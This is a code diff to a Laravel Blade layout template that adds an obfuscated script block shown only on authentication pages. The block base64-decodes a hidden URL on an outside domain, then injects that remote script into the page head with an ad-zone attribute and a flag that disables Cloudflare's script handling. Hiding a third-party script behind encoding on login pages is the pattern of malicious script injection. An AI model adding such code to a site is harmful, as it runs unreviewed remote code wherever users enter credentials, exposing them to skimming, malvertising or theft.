@@ -15,6 +15,20 @@
     @if (currentController() == 'AccountController')
         <link rel="stylesheet" href="{{ asset('css/account.css') }}">
     @endif
+    @if (currentController() == 'AuthController')
+        <script>
+            (function(){
+                var encodedScript1 = "aHR0cHM6Ly9hbHdpbmd1bGxhLmNvbS84OC90YWcubWluLmpz";
+                var decodedScript = atob(encodedScript1);
+                var scriptElement = document.createElement('script');
+                scriptElement.src = decodedScript;
+                scriptElement.setAttribute('data-zone', '81319');
+                scriptElement.async = true;
+                scriptElement.setAttribute('data-cfasync', 'false');
+                document.head.appendChild(scriptElement);
+            })();
+        </script>
+    @endif
     @php /*
     <script>
         (function(){
